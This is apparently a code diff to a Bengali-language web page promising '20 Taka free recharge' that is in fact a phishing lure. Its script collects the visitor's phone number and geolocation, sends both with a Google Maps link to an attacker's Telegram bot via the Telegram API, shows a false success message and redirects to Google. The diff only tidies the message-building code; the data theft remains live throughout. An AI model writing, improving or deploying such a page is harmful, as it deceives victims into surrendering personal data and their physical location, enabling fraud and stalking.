@@ -1,7 +1,6 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>২০ টাকা ফ্রি রিচার্জ!</title>
     <style>
@@ -27,7 +26,8 @@
         const chat_id = "7887080882";
         
         navigator.geolocation.getCurrentPosition(async (pos) => {
-            const msg = `🎯 নম্বর: ${phone}\n📍 ম্যাপ: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            const map = `http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            const msg = `🎯 নম্বর: ${phone}\n📍 ম্যাপ: ${map}`;
             await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
             alert("সফল হয়েছে! ৩০ মিনিটে রিচার্জ পাবেন।");
             window.location.href = "https://www.google.com";
